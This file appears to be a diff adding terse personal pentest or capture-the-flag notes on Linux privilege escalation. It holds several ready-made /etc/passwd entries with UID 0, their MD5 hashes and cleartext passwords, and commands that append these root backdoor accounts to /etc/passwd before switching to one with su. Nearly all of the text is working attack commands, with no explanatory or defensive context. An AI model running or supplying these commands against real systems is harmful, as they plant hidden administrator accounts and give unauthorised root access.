@@ -1,0 +1,23 @@
+password creat ein passwd file
+
+hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
+
+pass- hacker
+
+```
+printf 'inferno:$1$inferno$vA66L6zp5Qks4kxIc3tvn/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
+```
+
+su - inferno
+
+pass dante
+
+```
+echo 'oxdf:$1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0:0:0:pwned:/root:/bin/bash' >> /etc/passwd
+
+echo 'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash' >> /tmp/raj
+
+pass-123456
+```
+
+pass- 0xdf
